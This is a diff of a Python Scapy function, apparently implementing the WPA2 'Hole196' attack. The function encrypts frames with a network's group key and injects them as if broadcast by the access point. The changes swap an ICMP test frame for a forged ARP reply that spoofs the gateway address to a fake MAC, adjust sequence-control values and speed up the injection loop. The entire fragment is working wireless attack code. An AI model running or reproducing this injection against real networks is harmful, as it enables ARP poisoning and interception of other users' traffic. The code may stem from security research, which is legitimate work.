@@ -48,7 +48,7 @@ def atkHole196(pcapPath:str, pwd:str):
 
     
     bssAddr ='3C:A3:15:06:70:02' # FreeZio.2.4
-    srcAddr = '50:77:05:96:30:0a' # Pseudo MAC
+    srcAddr = '50:77:05:96:30:0b' # Pseudo MAC
     dstAddr = 'FF:FF:FF:FF:FF:FF'
 
     bssMAC ='3C:A3:15:06:70:0b' # FreeZio.2.4    
@@ -56,12 +56,18 @@ def atkHole196(pcapPath:str, pwd:str):
     seq = 1
     pn = 500
     while(True):
-        plainFrame = LLC()/SNAP()/\
-            IP(src='192.168.0.128', dst='192.168.0.1')/ICMP()/Raw(b"icmp_ping_test")
-        
         # plainFrame = LLC()/SNAP()/\
-        # ARP(hwsrc='11:22:33:44:55:66', hwdst=srcAddr, psrc='192.168.0.1', pdst='192.168.0.128' ,op=2)
+        #     IP(src='192.168.0.1', dst='192.168.0.128')/ICMP()/Raw(b"icmp_ping_test")
         
+        plainFrame = LLC()/SNAP()/\
+        ARP(hwsrc='11:22:33:44:55:66', hwdst=srcAddr, psrc='192.168.0.1', pdst='192.168.0.255' ,op=2)
+
+        # encFrame = ccmp.encrypt(gtk, plainFrame, dstAddr, srcAddr, bssAddr, pn)
+        # encFrame = RadioTap() /\
+        #     Dot11(type=2, subtype=0, addr1=dstAddr, addr2=srcAddr, addr3=bssAddr)/\
+        #     Dot11CCMP() /\
+        #     Raw(encFrame) # BSS
+
         encFrame = ccmp.encrypt(gtk, plainFrame, dstAddr, bssAddr, srcAddr, pn)
         encFrame = RadioTap() /\
             Dot11(type=2, subtype=0, addr1=dstAddr, addr2=bssAddr, addr3=srcAddr)/\
@@ -76,7 +82,7 @@ def atkHole196(pcapPath:str, pwd:str):
         
         #encFrame.FCfield = "to-DS"
         encFrame.FCfield = "from-DS"
-        encFrame.SC=0
+        encFrame.SC=produce_sc(0, 5)
         
         encFrame.FCfield |= Dot11(FCfield="protected").FCfield
         encFrame.PN0, encFrame.PN1, encFrame.PN2, encFrame.PN3, encFrame.PN4, encFrame.PN5 = pn2bytes(pn)
@@ -87,5 +93,5 @@ def atkHole196(pcapPath:str, pwd:str):
         seq += 1
         
         print(pn)
-        time.sleep(0.5)
+        time.sleep(0.1)
     # 
